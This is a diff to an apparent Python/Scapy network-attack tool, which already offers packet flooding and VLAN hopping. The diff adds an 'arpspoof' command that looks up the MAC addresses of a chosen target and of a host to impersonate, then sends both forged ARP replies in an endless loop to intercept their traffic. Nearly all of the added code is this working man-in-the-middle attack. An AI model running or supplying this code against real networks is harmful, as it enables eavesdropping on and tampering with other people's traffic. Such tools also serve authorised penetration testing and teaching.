@@ -20,6 +20,7 @@ flood_parser = subparsers.add_parser('flood',help='Flood packages')
 
 vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')
 
+arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')
 
 main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
 main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")
@@ -28,6 +29,11 @@ flood_parser.add_argument("-t","--floodtype",help="Flood type", choices =["unkno
 flood_parser.add_argument("-c","--packetcount",help="Amount of packets", default=65000,type=int)
 flood_parser.add_argument("-d","--destinationip",help="Destination IP Address",default="0.0.0.0")
 flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Address",default="00:01:02:03:04:05")
+
+arpspoof_parser.add_argument("-t","--target",help="IP address of the target device whose traffic you wish to intercept.",required=True)
+arpspoof_parser.add_argument("-i","--impersonate",help="IP address of the device you want to impersonate to the target.",required=True)
+arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, default=0.5s",default=0.5)
+
 
 #vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
 #vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")
@@ -52,6 +58,7 @@ isl_link_flags = {
 
 
 event_LACP_Established = threading.Event()
+
 
 
 # level 0 = standard output, level 1 = info, level 2 = debug
@@ -100,6 +107,36 @@ def fortilink_isl(lldp_keep_alive):
        sendp(lldp_keep_alive,verbose=0)
        time.sleep(1)
 
+def arpspoof():
+   print("Launching arpspoof attack")
+   print("Retrieve MAC for target (",main_args.target,"): ",sep="",end="",flush=True)
+   arp_request= ARP(pdst=main_args.target)
+   answer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=main_args.target),timeout=5,verbose=False)
+   if len(answer[0]) > 0:
+      print (answer[0][0][1].hwsrc)
+      targetMAC = answer[0][0][1].hwsrc
+   else:
+     print("No response")
+     return
+
+   print("Retrieve MAC for impersonated host (",main_args.impersonate,"): ",sep="",end="",flush=True)
+   arp_request= ARP(pdst=main_args.impersonate)
+   answer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=main_args.impersonate),timeout=5,verbose=False)
+   if len(answer[0]) > 0:
+      print (answer[0][0][1].hwsrc)
+      impersonateMAC = answer[0][0][1].hwsrc
+   else:
+     print("No response")
+     return
+
+   print("ARP Attack running.")
+   while True:
+      #packet to target
+      sendp(Ether(dst=targetMAC)/ARP(op="is-at",psrc=main_args.impersonate,pdst=main_args.target,hwdst=targetMAC),count=1,verbose=False)
+      #packet to impersonated host
+      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)      
+      time.sleep(main_args.frequency)
+
 
 def vlanhop(iface=main_args.interface):
     print("Launching vlanhop attack")
@@ -112,7 +149,7 @@ def vlanhop(iface=main_args.interface):
        print("timeout")
        dprint("FAIL: No LLDP packet received")
        return
-    
+
     dprint("received")
     dprint("System name:",packet[0][LLDPDUSystemName].system_name.decode("UTF-8"))
     dprint("System description:",packet[0][LLDPDUSystemDescription].description.decode("UTF-8"))
@@ -249,3 +286,6 @@ if action=="flood":
 
 if action=="vlanhop":
    vlanhop()
+
+if action=="arpspoof":
+   arpspoof()
